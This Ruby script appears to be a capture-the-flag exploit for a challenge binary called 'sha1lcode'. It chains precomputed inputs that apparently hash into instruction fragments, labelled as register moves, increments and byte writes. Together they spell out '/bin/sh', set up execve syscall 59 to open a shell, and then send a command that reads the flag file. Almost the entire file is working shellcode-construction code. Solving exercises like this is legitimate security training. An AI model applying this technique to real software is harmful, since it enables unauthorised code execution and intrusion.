#!/usr/bin/env ruby

mov_rcx_rax = '0000000005956924'
mov_rax_rsi = '0000000019221105'
mov_rax_rdx = '0000000012851142'
inc_rdx = '0000000008277163'
mov_rdx_mrax = '0000000062517457'
xor_rdx_rdx = '0000000012024928'
mov_rax_rdi = '0000000039570129'
movb_2f_mrax = '0000000068497096'
inc_rax = '0000000021765295'
movb_62_mrax = '0000000000137407'
movb_69_mrax = '0000000024172868'
movb_6e_mrax = '0000000024188522'
movb_2f_mrax = '0000000068497096'
movb_73_mrax = '0000000006453988'
movb_68_mrax = '0000000004867185'
movb_00_mrax = '0000000020736806'
mov_rsi_rdx = '0000000003456370'
xor_rax_rax = '0000000011556553'

$jmp_3 = 'aaaafqcuaaaafqcu'
$jmp_2 = 'aaaaeakuaaaaeaku'
#xor_eax = 'aaaabbwpaaaabbwp'
#inc_eax = 'aaaahtnnaaaahtnn'

syscall = 'aaaacklnaaaackln'

$o = ''

def out(a)
  $o += $jmp_3
  $o += a
end

out(mov_rax_rsi)
out(mov_rax_rdx)
16.times{out(inc_rdx)}
out(mov_rdx_mrax)

8.times{out(inc_rax)}
out(xor_rdx_rdx)
out(mov_rdx_mrax)

8.times{out(inc_rax)}
out(mov_rax_rdi)

[movb_2f_mrax,
 movb_62_mrax,
 movb_69_mrax,
 movb_6e_mrax,
 movb_2f_mrax,
 movb_73_mrax,
 movb_68_mrax,
 movb_00_mrax].each{|a|
  out(a)
  out(inc_rax)
}

out(mov_rsi_rdx)
out(xor_rax_rax)
59.times{out(inc_rax)}

$o += syscall

#print $o

print [$o.size / 16].pack("L*")
print $o

puts 'cat /home/sha1lcode/flag'
#print 'a' * 1000000


# pipe = IO.popen('./sha1lcode-5b43cc13b0fb249726e0ae175dbef3fe', 'r+')

# while l = gets
#   pipe.puts l
#   puts pipe.gets
# end
